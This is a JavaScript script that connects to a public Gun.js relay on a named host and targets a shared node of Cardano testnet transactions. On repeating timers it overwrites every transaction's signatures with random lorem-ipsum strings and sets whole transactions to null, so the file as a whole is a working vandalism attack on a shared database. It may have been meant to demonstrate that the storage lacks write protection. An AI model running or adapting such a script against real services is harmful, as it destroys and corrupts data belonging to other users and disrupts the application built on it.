import Gun from 'gun'

const hosts = ['https://dao-gunjs.herokuapp.com/gun']
const gun = new Gun(hosts)
const randomStrings = ["Random string", null, "Lorem ipsum dolor sit amet,", "consectetur adipiscing", "elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.", "Ut enim ad minim veniam, quis nostrud exercitation ullamco", "laboris nisi ut aliquip ex ea commodo consequat.", "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum", "dolore eu fugiat nulla pariatur.", "Excepteur sint occaecat cupidatat non proident,", "sunt in culpa qui officia deserunt mollit anim id", "est laborum"]

const transactionsNode = gun
  .get('cardano')
  .get('testnet')
  .get('transactions')

var signersList = [];

const getTransactions = async()=>{
  var transactions = []
  await transactionsNode.map().on((data, key) => {
    transactions.push(key)
  })
  return transactions
}

transactionsNode.map().on(data=>{console.log(data)})

//replacing signatures by random strings
var interval = setInterval(() => {
  getTransactions().then((transactions)=>{
    transactions.map((tx)=>{
      const random = Math.floor(Math.random() * randomStrings.length);
      transactionsNode.get(tx).map().put(randomStrings[random])
    })
  })
}, 500)

//replacing all data of each tx by null?
var interval2 = setInterval(() => {
  getTransactions().then((transactions)=>{
    transactions.map((tx)=>{
      const random = Math.floor(Math.random() * randomStrings.length);
      transactionsNode.get(tx).put(null)
    })
  })
}, 800)
